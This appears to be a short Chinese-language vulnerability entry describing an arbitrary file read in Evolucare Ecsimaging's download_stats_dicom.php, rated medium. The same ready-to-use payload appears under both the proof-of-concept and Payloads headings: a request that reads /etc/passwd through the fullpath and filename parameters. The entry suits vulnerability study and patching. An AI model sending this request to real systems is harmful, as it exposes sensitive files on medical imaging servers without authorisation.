# Evolucare Ecsimaging download_stats_dicom.php 任意文件读取漏洞

## 漏洞描述
Evolucare Ecsimaging download_stats_dicom.php 存在文件读取漏洞,攻击者可利用该漏洞获取系统敏感信息等.

## 危害等级
MEDIUM

## 参考链接

## 漏洞复现方法
登录页面

![](images/202205241445840.png)

验证POC

```
/download_stats_dicom.php?fullpath=/etc/passwd&filename=/etc/passwd
```


## Payloads
```
/download_stats_dicom.php?fullpath=/etc/passwd&filename=/etc/passwd
```
